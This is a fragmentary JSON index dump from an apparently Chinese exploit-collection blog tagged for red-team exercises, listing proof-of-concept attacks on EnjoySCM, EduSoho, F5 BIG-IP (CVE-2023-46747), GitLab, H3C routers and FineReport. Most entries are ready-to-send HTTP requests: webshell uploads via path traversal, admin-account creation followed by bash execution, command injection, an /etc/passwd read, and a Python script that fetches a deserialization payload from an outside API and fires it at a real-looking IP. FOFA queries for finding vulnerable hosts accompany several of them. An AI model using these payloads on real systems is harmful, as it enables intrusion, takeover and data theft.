AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cookie: JSESSIONID=5f9d64b1-ef44-40d1-8266-3ebea0d51e89;rememberMe=deleteMe; Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/dst-admin-%E9%A5%A5%E8%8D%92%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0-sendbroadcast-%E6%96%87%E4%BB%B6-message-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0649/:1:0","tags":["2023hw"],"title":"dst-admin 饥荒管理后台 sendBroadcast 文件 message 参数远程命令执行漏洞（CVE-2023-0649）","uri":"/dst-admin-%E9%A5%A5%E8%8D%92%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0-sendbroadcast-%E6%96%87%E4%BB%B6-message-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0649/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"Powered By EduSoho\" || body=\"Powered by \u003ca href=\\\"http://www.edusoho.com/\\\" target=\\\"_blank\\\"\u003eEduSoho\" || (body=\"Powered By EduSoho\" \u0026\u0026 body=\"var app\") EduSoho教培系统是由杭州阔知网络科技有限公司研发的开源网校系统,该教培系统\u003cv22.4.7 存在未授权任意文件读取漏洞，通过该漏洞攻击者可以读取到config/parameters.yml文件的内容，拿到该文件中保存的secret值以及数据库账号密码等敏感信息。拿到secret值后，攻击者可以结合symfony框架_fragment路由实现RCE ","date":"2023-12-08","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-classroom-course-statistics-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecnvd-2023-03903/:0:0","tags":["2023hw"],"title":"edusoho 教培系统 classroom-course-statistics 任意文件读取漏洞（CNVD-2023-03903）","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-classroom-course-statistics-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecnvd-2023-03903/"},{"categories":["2023hw"],"content":"poc ","date":"2023-12-08","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-classroom-course-statistics-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecnvd-2023-03903/:1:0","tags":["2023hw"],"title":"edusoho 教培系统 classroom-course-statistics 任意文件读取漏洞（CNVD-2023-03903）","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-classroom-course-statistics-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Ecnvd-2023-03903/"},{"categories":["2023hw"],"content":"\\[漏洞情报\\] EnjoySCM UploadFile 任意文件上传漏洞\r===================================== 漏洞标题 EnjoySCM UploadFile 任意文件上传漏洞 漏洞描述 EnjoySCM是一款适应于零售企业的供应链管理软件，主要为零售企业的供应商提供服务。 EnjoySCM UploadFile 参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。 漏洞细节: ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"FOFA： title=\"供应商网上服务厅\" ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"PoC: POST /File/UploadFile HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394 Content-Length: 531 Connection: close Cookie: Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -----------------------------21909179191068471382830692394 Content-Disposition: form-data; name=\"file\"; filename=\"../../../1111.aspx\" Content-Type: image/jpeg webshell -----------------------------21909179191068471382830692394 Content-Disposition: form-data; name=\"action\" unloadfile -----------------------------21909179191068471382830692394 Content-Disposition: form-data; name=\"filepath\" -----------------------------21909179191068471382830692394 这套系统漏洞很多，源码可以在这里下载：https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip 加固建议: 严格限制上传文件类型； 联系厂商获取加固建议。 ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"\\[漏洞情报\\] EnjoySCM UploadFile 任意文件上传漏洞第二处\r======================================== 漏洞标题 EnjoySCM UploadFile 任意文件上传漏洞第二处 漏洞描述 EnjoySCM是一款适应于零售企业的供应链管理软件，主要为零售企业的供应商提供服务。 EnjoySCM UploadFile 参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。 C 漏洞细节: ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/:0:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞第二处","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":["2023hw"],"content":"FOFA: title=\"供应商网上服务厅\" ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/:1:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞第二处","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":["2023hw"],"content":"PoC: 前面在某公众号看到的一个漏洞，下载代码稍微看了一下 漏洞有点多 - - 源码可以在这里下载：https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip POST /ImportData/UploadFile HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"101\", \"Chromium\";v=\"101\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxwovFKSa Content-Length: 153 ------WebKitFormBoundaryxwovFKSa Content-Disposition: form-data; name=\"file\";filename=\"../../../test3.aspx\" test3 ------WebKitFormBoundaryxwovFKSa-- 加固建议: 严格限制上传文件类型； 联系厂商获取加固建议。 ","date":"2023-12-08","objectID":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/:2:0","tags":["2023hw"],"title":"EnjoySCM UploadFile 任意文件上传漏洞第二处","uri":"/enjoyscm-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":["2023hw漏洞"],"content":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747) ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:1:0","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"漏洞描述 F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)，未经授权的远程攻击者通过管理端口或自身IP地址访问BIG-IP系统，利用此漏洞可能绕过身份认证，导致在暴露流量管理用户界面（TMUI）的 F5 BIG-IP 实例上执行任意代码。 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:2:0","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"影响版本 F5 BIG-IP \u003c= 17.1.0 16.1.0 \u003c= F5 BIG-IP \u003c= 16.1.4 15.1.0 \u003c= F5 BIG-IP \u003c= 15.1.10 14.1.0 \u003c= F5 BIG-IP \u003c= 14.1.5 13.1.0 \u003c= F5 BIG-IP \u003c= 13.1.5 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:3:0","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"环境下载 https://my.f5.com/manage/s/downloads?productFamily=BIG-IP\u0026productLine=big-ip_v15.x\u0026version=15.1.8\u0026container=Virtual-Edition\u0026files=BIGIP-15.1.8-0.0.7.ALL-vmware.ova\u0026locations=JAPAN 链接：https://pan.baidu.com/s/1zLMXJCKtZtzIxCQGoxwPgg 提取码：ksdn 搭建方式很简单，下载BIGIP-15.1.8-0.0.7.ALL-vmware.ova，接着用vm打开ova即可 搭建过程 F5 WMware虚拟机环境搭建-BIG-IP Virtual Edition 11.3.0-CSDN博客 重置web密码 进入tmsh模式 敲击 modify auth user admin password admin 搭建成功页面 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:4:0","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:5:0","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"第一步 发送 TMUI模块的请求 当发送到F5 BIG-IP TMUI模块的请求（例如登陆页面/tmui/login.jsp）中，包含一个类似值为 “xxx, chunked” 的 “Transfer-Encoding” 头，并且请求体内容满足特定内容时，漏洞会被触发。 \u0026name=adminqq\u0026name_before=\u0026passwd=admin789456 参数填入创建账户 POST /tmui/login.jsp HTTP/1.1 Host: 192.168.127.146 Content-Type: application/x-www-form-urlencoded 204 \u0008HTTP/1.1\u0012/tmui/Control/form 127.0.0.1 localhost localhostP\u0003\u000bTmui-Dubbuf\u000bBBBBBBBBBBB REMOTEROLE\u00010�\u000blocalhost\u0003\u0005admin\u0005\u0001q_timenow=a\u0026_timenow_before=\u0026handler=%2ftmui%2fsystem%2fuser%2fcreate\u0026\u0026\u0026form_page=%2ftmui%2fsystem%2fuser%2fcreate.jsp%3f\u0026form_page_before=\u0026hideObjList=\u0026_bufvalue=eIL4RUnSwXYoPUIOGcOFx2o00Xc%3d\u0026_bufvalue_before=\u0026systemuser-hidden=[[\"Administrator\",\"[All]\"]]\u0026systemuser-hidden_before=\u0026name=adminqq\u0026name_before=\u0026passwd=admin789456\u0026passwd_before=\u0026finished=x\u0026finished_before=� 0 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:5:1","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"第二步 获取用户token POST /mgmt/shared/authn/login HTTP/1.1 Host: 192.168.127.146 Content-Length: 22 Content-Type: application/x-www-form-urlencoded {\"username\":\"admin\", \"password\":\"admin789456\"} ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:5:2","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"第三步 执行命令 将获取到得token带入X-F5-Auth-Token中，在通过/mgmt/tm/util/bash 执行命令 POST /mgmt/tm/util/bash HTTP/1.1 Host: 192.168.127.146 Connection: keep-alive Content-Length: 22 X-F5-Auth-Token:ICGZXJJROASFRPWYZF3EAQFCGN {\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"} ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:5:3","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw漏洞"],"content":"参考链接 https://mp.weixin.qq.com/s/iN7rlJJaI4sl-fiL0eMXsQ https://github.com/projectdiscovery/nuclei-templates/blob/56d79688e0d2ebce5b8939961946f4f32e663700/http/cves/2023/CVE-2023-46747.yaml https://mp.weixin.qq.com/s/wUoBy7ZiqJL2CUOMC-8Wdg https://blog.csdn.net/ice_age1/article/details/49998059 ","date":"2023-12-08","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/:5:4","tags":["2023hw漏洞"],"title":"F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747)","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46747/"},{"categories":["2023hw"],"content":"```\r/test/test1/test2/test3/test4/test5/test6/test7/test8/111/uploads/2ac45b38daa86ac6f81eac0d5 d4997b1/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2fpasswd ","date":"2023-12-08","objectID":"/gitlab-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"GitLab 目录遍历漏洞","uri":"/gitlab-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## CommonsBeanutils1183NOCC\rPOST /api/v1/ysoserial HTTP/1.1 Host: gobygo.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 152 gadget=CommonsBeanutils1183NOCC¶meters=EX-MS-TFMSFromThread-bx\u0026encoding=base64\u0026url=%2FGqExyxgcDfcc\u0026password=goby\u0026referer=https%3A%2F%2Fgobygo.net%2F WebShell URL: http://1.58.73.61/webroot/XBJhGtvZBwOF Password: goby Webshell tool: Behinder v3.0 Webshell type: jsp Referer: https://gobygo.net/ ","date":"2023-12-08","objectID":"/goby-yso-api-%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/:0:0","tags":["2023hw"],"title":"goby yso api 注入冰蝎内存马","uri":"/goby-yso-api-%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/"},{"categories":["2023hw"],"content":"```\rimport requests import base64 设置请求头 headers = { ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15’, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Accept-Encoding’: ‘gzip’ } 设置POST请求数据 data = { ‘gadget’: ‘CommonsBeanutils1183NOCC’, ‘parameters’: ‘EX-MS-TFMSFromThread-bx’, ’encoding’: ‘base64’, ‘url’: ‘/3355’, ‘password’: ‘goby’, ‘referer’: ‘https://gobygo.net/' } 发送POST请求 response = requests.post(‘https://gobygo.net/api/v1/ysoserial' , headers=headers, data=data) 获取响应中的payload并解码 payload = response.json()[‘data’][‘payload’] print(“payload:\"+ payload) decoded_payload = base64.b64decode(payload) 发送POST请求 response = requests.post(‘http://120.78.127.52/webroot/decision/remote/design/channel’, headers=headers, data=decoded_payload) 输出最终响应 print(response.text) ","date":"2023-12-08","objectID":"/goby-yso/:0:0","tags":["2023hw"],"title":"goby-yso","uri":"/goby-yso/"},{"categories":["2023hw"],"content":"https://github.com/Darry-lang1/vuln/tree/main/H3C/GR-1200W/19\r","date":"2023-12-08","objectID":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/:0:0","tags":["2023hw"],"title":"H3C GR-1200W 路由器 goform aspForm DelL2tpLNSList 方法的 param 参数命令注入漏洞（CVE-2022-37070）","uri":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/"},{"categories":["2023hw"],"content":"fofa fid=\"dhDspYzZwrQeZglXXkew6w==\" ","date":"2023-12-08","objectID":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/:1:0","tags":["2023hw"],"title":"H3C GR-1200W 路由器 goform aspForm DelL2tpLNSList 方法的 param 参数命令注入漏洞（CVE-2022-37070）","uri":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/"},{"categories":["2023hw"],"content":"exp POST /goform/aspForm HTTP/1.1 Host: 192.168.0.124:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://121.226.152.63:8443/router_password_mobile.asp Content-Type: application/x-www-form-urlencoded Content-Length: 553 Origin: https://192.168.0.124:80 DNT: 1 Connection: close Cookie: JSESSIONID=5c31d502 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 CMD=DelL2tpLNSList¶m=1; $(ps\u003e/www/1); ","date":"2023-12-08","objectID":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/:2:0","tags":["2023hw"],"title":"H3C GR-1200W 路由器 goform aspForm DelL2tpLNSList 方法的 param 参数命令注入漏洞（CVE-2022-37070）","uri":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/"},{"categories":["2023hw"],"content":"exp 发送请求包执行命令: POST /goform/aspForm HTTP/1.1 Host: 192.168.2.35:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 74 Content-Type: application/x-www-form-urlencoded Referer: http://192.168.2.35:8081/userLogin.asp Accept-Encoding: gzip CMD=DelL2tpLNSList\u0026GO=vpn_l2tp_session.asp¶m=1; $(ls\u003e/www/test); 访问命令执行结果: GET /test HTTP/1.1 Host: 192.168.2.35:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Referer: http://192.168.2.35:8081/userLogin.asp Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/:3:0","tags":["2023hw"],"title":"H3C GR-1200W 路由器 goform aspForm DelL2tpLNSList 方法的 param 参数命令注入漏洞（CVE-2022-37070）","uri":"/h3c-gr-1200w-%E8%B7%AF%E7%94%B1%E5%99%A8-goform-aspform-dell2tplnslist-%E6%96%B9%E6%B3%95%E7%9A%84-param-%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2022-37070/"},{"categories":["2023hw漏洞"],"content":"H3C Magic B1STV100R012 RCE POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 1569 Content-Type: application/x-www-form-urlencoded pfdrt=sc\u0026ln=primefaces\u0026pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D\u0026cmd=whoami fofa：app=“H3C-Ent-Router” POST /goform/aspForm HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Connection: close Content-Length: 68 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Referer: http://{{Hostname}}/userLogin.asp 